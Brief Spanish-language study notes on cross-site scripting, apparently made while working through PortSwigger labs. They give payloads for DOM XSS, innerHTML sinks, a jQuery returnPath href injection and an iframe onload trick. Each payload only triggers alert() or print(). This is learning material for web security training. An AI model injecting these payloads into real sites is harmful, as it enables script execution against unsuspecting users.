# XSS

Estos apuntes de XSS los estoy haciendo con base a los laboratorios de Portswigger

### DOM XSS

> Cuando se ve la consulta en el DOM (Estructura de html) se puede uno escapara la sanetizacion de la siguiente manera

```
"><script>alert("test");</script>
```


### InnerHTML

>Cuando se evidendicia que la consulta esta en InnerHTML y no se interpreta codigo javascript puede servir:

```
<img src=imagenfalsa.png onerror=alert("test")>
```

### DOM XSS in jQuery anchor href attribute

>Es curioso que se presente en la URL el campo ?returnPath=/ y ese precisamente es el que se puede cambiar asi:

```
?returnPath=javascript:alert("test")
```

```
<iframe src="https://URL_LAB/#" onload="this.src+='<img src=1 onerror=print()>'">
```
